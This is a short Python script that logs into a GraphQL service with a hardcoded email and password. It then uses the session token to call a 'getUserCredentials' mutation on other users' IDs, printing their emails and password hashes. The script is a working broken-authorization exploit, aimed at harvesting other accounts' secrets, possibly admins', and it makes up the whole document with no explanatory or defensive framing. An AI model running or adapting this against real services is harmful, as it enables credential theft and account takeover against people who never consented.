import requests
import json

url = 'https://mail.equestriasociety.com/graphql'
query = """
mutation {
  login(email: "luna.belle@equestriasociety.com", password: "CorrectHorseBatteryStaple?") {
    token
  }
}
"""

response = requests.post(url, json={'query': query})
data = response.json()
if 'data' in data and data['data']['login']:
    token = data['data']['login']['token']
    headers = {'Authorization': f'Bearer {token}'}

    # Since we can list users, can we use getUserCredentials for admin users?
    users = [
      "401b2b45-603b-4ca1-a87e-a5df685b20d9", # Luna Starlight
      "e9c81f0b-9665-4a61-99bd-7c5ac28b0720", # Melody Shine
    ]

    for uid in users:
        query = f"""
        mutation {{
          getUserCredentials(id: "{uid}") {{
            id
            email
            passwordHash
          }}
        }}
        """
        r = requests.post(url, json={'query': query}, headers=headers)
        print(f"User {uid}:")
        print(json.dumps(r.json(), indent=2))
